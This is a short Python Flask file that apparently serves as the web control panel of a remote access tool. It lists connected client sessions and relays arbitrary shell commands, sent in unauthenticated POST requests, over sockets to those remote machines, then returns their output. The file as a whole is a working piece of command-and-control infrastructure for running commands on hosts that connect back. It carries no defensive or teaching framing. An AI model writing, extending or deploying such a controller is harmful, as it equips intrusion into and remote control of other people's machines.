from flask import Flask, jsonify, request
from modules.communication import send_data, recv_data
from modules.client_management import client_info_map

app = Flask(__name__, static_folder='static', template_folder='templates')

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    return jsonify([info for info in client_info_map.values()])

@app.route('/api/execute', methods=['POST'])
def execute_command():
    data = request.json
    session_id = data.get('sessionId')
    command = data.get('command')
    target_info = next((info for info in client_info_map.values() if info['session_id'] == session_id), None)
    if not target_info:
        return jsonify({'output': 'Invalid session ID'}), 400
    target_socket = target_info['socket']
    send_data(target_socket, {"cmd": command})
    response = recv_data(target_socket)
    return jsonify({'output': response.get('output', 'No output') if response else 'Error'})

if __name__ == '__main__':
    from modules.communication import server_listen
    import threading
    listen_thread = threading.Thread(target=server_listen, daemon=True)
    listen_thread.start()
    app.run(port=5000)